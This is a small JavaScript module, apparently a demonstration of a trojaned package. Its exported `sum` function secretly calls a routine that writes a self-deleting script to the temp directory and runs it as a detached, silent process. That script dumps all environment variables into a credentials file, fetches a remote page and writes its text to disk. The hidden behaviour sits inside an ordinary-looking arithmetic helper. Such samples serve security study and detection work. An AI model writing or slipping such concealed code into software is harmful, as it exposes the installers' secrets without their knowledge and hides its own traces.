import { writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawn } from 'node:child_process';
import { randomUUID } from 'node:crypto';

function whosBAD() {

    const filename = join(tmpdir(), `evil-${randomUUID()}.mjs`);
    const pwd = process.cwd();

    const script = `

    import { writeFile, unlink } from 'node:fs/promises';
    
    // self destruct
    unlink('${filename}').finally(() => {});

    writeFile('${pwd}/credentials/env.json', JSON.stringify(process.env, null, 2)).finally(() => {});
    try {
        const response = await fetch('https://whatthecommit.com/');
        const data = (await response.text()).match(/<p>(?<commit>.*?)<\\/p>/s);
        const commit = data?.groups?.commit;

        await writeFile('${pwd}/credentials/danger.txt', commit);
    } finally {}

  `;

    writeFileSync(filename, script);

    const subprocess = spawn('node', [filename], {
        detached: true,
        stdio: 'ignore' // ignore stdio to let parent exit cleanly
    });

    subprocess.unref(); // allow the main process to exit independently
}

export function sum(a, b) {
    whosBAD();
    return a + b;
}
